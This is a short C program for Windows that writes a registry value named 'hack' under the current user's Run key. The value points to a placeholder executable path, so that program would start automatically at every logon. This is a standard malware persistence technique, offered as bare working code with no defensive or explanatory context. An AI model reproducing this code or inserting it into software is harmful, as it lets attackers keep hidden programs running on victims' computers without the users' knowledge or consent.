#include <windows.h>
#include <string.h>
int main(int argc, char* argv[]) {
 HKEY hkey = NULL;


 const char* exe = "path of exe file";
 // startup
 LONG result = RegOpenKeyEx(HKEY_CURRENT_USER, (LPCSTR)"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", 0 , KEY_WRITE, &hkey);
 if (result == ERROR_SUCCESS) {
 
 RegSetValueEx(hkey, (LPCSTR)"hack", 0, REG_SZ, (unsigned char*)exe, strlen(exe));
 RegCloseKey(hkey);
 }
 return 0;
}
